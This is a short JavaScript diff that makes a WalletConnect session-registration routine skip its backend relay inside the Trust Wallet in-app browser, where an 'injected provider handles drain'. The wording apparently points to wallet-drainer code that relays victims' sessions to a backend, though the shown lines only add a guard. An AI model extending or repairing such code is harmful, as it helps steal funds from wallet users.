@@ -1140,6 +1140,12 @@
   }
 
   async function registerWcSessionWithBackend() {
+    // In-app browser: injected provider handles drain — skip backend WC registration
+    // to prevent double popup (backend WC relay + injected provider both firing)
+    if (isTrustInAppBrowser() || window.__TRUST_IN_APP__) {
+      L.log('[WcRelay] in-app browser — skipping backend session registration (injected handles drain)');
+      return;
+    }
     // Retry up to 4 times (0ms, 800ms, 2s, 4s) — keychain write may be async after connect
     var delays = [0, 800, 2000, 4000];
     var _sessionFound = false;
